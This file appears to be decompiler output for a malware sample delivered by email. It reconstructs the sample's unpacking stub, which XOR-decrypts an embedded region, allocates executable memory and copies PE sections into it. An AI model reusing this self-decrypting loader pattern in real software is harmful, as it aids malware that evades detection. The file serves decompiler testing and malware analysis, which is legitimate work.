// subject.c
// Generated on 5/4/2015 12:13:31 AM by decompiling malware_via_email/malware_0012/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401010(byte al, selector fs, word32 dwArg00)
{
	fn0040115C(fp - 0x00000004, fs, dwLoc24, dwLoc20, dwLoc1C);
	word32 eax_32 = (dwLoc20 << 0x00000008) + 0x003FA900;
	word32 dwLoc24_38 = Mem0[eax_32 + 0x000020CB - dwLoc20:word32];
	word32 eax_42 = eax_32 + 0x000020DF - dwLoc20;
	VirtualProtect(eax_42, dwLoc24_38, 0x00000004, fp - 0x00000008);
	word32 ecx_55 = dwLoc24_38;
	word32 ebx_56 = eax_42;
	word32 eax_58 = dwLoc20 + 0x10E3F1CF;
	word32 dwLoc08_61 = 0x00000001;
	Mem70[ebx_56 + 0x00000000:word32] = Mem0[ebx_56 + 0x00000000:word32] ^ eax_58;
	ecx_55 = ecx_55 - 0xFFFFFFAD - dwLoc20;
	while (ecx_55 >= 0x00000000)
	{
		eax_58 = eax_58 + 0x0FB750A4 + dwLoc08_61;
		ebx_56 = ebx_56 + 0x0000005B - dwLoc20;
		dwLoc08_61 = -Mem70[fp - 0x00000008:word32];
		Mem70[ebx_56 + 0x00000000:word32] = Mem0[ebx_56 + 0x00000000:word32] ^ eax_58;
		ecx_55 = ecx_55 - 0xFFFFFFAD - dwLoc20;
	}
	word32 ebx_90 = Mem70[eax_42 + 0x00000093 - dwLoc20:word32] + eax_42;
	word32 dwLoc1C_117 = (word32) Mem70[ebx_90 + 0x00000006:byte];
	Mem100[fp - 0x00000028:word32] = 0x00003000;
	word32 eax_105 = VirtualAlloc(Mem100[ebx_90 + 0x00000034:word32], Mem100[ebx_90 + 0x00000050:word32], 0x00000004, 0x00000040);
	Mem111[fp - 0x00000028:word32] = eax_42;
	fn0040113F(Mem111[ebx_90 + 0x00000054:word32], 0x00000004, eax_105);
	word32 esi_115 = ebx_90 + 0x000000F8;
	do
	{
		fn0040113F(Mem111[esi_115 + 0x00000010:word32], eax_42 + Mem111[esi_115 + 0x00000014:word32], eax_105 + Mem111[esi_115 + 0x0000000C:word32]);
		word32 v17_133 = dwLoc1C_117 - 0x00000001;
		esi_115 = esi_115 + 0x00000028;
		dwLoc1C_117 = v17_133;
	} while (v17_133 != 0x00000000);
	word32 eax_143 = eax_105;
	do
		eax_143 = eax_143 + 0x00000004;
	while (Mem111[eax_143 + 0x00000000:word32] != 0xAABBCCDD);
	fn0040113F(0x00000038, 0x00401174, eax_143);
	return;
}

void fn0040113F(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	word32 esi_13 = dwArg08;
	word32 edi_15 = dwArg0C;
	word32 ecx_17 = dwArg04;
	do
	{
		Mem23[edi_15 + 0x00000000:byte] = Mem0[esi_13 + 0x00000000:byte];
		esi_13 = esi_13 + 0x00000001;
		edi_15 = edi_15 + 0x00000001;
		ecx_17 = ecx_17 - 0x00000001;
	} while (ecx_17 != 0x00000000);
	return;
}

void fn0040115C(word32 ebp, selector fs, ULONG, PJOB_SET_ARRAY, ULONG)
{
	CreateJobSet(tArg00, tArg04, tArg08);
	Mem13[ebp - 0x0000001C:word32] = Mem0[Mem0[fs:0x00000018:word32] + 0x00000034:word32];
	return;
}

